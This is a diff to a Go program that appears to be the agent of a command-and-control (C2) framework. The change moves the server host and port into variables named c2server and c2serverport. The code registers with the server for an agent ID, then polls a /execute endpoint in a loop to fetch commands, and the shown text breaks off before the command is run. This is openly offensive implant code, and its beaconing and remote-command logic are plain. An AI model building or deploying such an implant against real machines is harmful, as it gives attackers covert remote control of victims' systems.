@@ -11,19 +11,24 @@ import (
 	"time"
 )
 
+var c2server = "localhost"
+var c2serverport = "80"
+
 func main() {
 	agentId := ""
 	// sleep := time.Duration(10)
 	sleep := 10
-	resp, err := http.Get("http://localhost:80/register")
+	// resp, err := http.Get("http://localhost:80/register")
+	c2register := "http://" + c2server + ":" + c2serverport + "/register"
+	register_resp, err := http.Get(c2register)
 
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	defer resp.Body.Close()
+	defer register_resp.Body.Close()
 
-	body, err := ioutil.ReadAll(resp.Body)
+	body, err := ioutil.ReadAll(register_resp.Body)
 	agentId = string(body)
 	if err != nil {
 		log.Fatal(err)
@@ -36,16 +41,18 @@ loop:
 		data := url.Values{
 			"agentId": {agentId},
 		}
-		resp2, err := http.PostForm("http://localhost:80/execute", data)
+		// resp2, err := http.PostForm("http://localhost:80/execute", data)
+		c2execute := "http://" + c2server + ":" + c2serverport + "/execute"
+		execute_response, err := http.PostForm(c2execute, data)
 
 		if err != nil {
 			log.SetFlags(0)
 			log.Printf("[-] Error fetching command: %s", err)
 		}
 
-		defer resp2.Body.Close()
+		defer execute_response.Body.Close()
 
-		command, err := ioutil.ReadAll(resp2.Body)
+		command, err := ioutil.ReadAll(execute_response.Body)
 
 		if string(command) == "no commands found" {
 			log.SetFlags(0)
